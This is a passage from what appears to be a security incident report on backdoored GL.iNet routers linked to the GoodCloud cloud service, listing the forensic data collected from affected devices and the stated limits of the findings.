of 20 November, the older backdoor, or both ([field survey](field-survey.md)). That is not a
random sample: almost all have GoodCloud switched on, and only routers that were online when we
checked are counted.

Measured on the routers, read-only before any change: the process list and connections, process
start times from `/proc`, the pipe, the firewall rule, the state file and its two times, the
start-up script and keep list compared with the copies under `/rom`, the cloud binding time,
the cloud package version, the WAN address, and on some routers the memory of the cloud client,
the shells and the backdoor processes. Read from firmware: the cloud client's module files from
GL.iNet's release images, each matching its published SHA-256, and from three routers (on the
4.8.3 router the files matched the image).

Limits, in one place:

- The 4.7 builds of the handler were confirmed by strings only.
- Package build git-2025.062, in GL-AXT1800 and GL-AX1800 4.7.0, has not been read.
- When the cloud side became usable by an outsider is not known.
- From the routers we cannot see what the attacker's server did with the answers, or what else
  was sent to routers that restarted before we checked.
- A router restarted since 20 November keeps only the state file and the older backdoor; a clean
  result on it says little.
- File dates on the older backdoor are the routers' own clocks; only 40 of the 49 gave a real date.
- The fix was read in GL-MT3000 4.11.1 only, and not tested against the attack message.
- The cloud log entry is Reported, not checked by us.
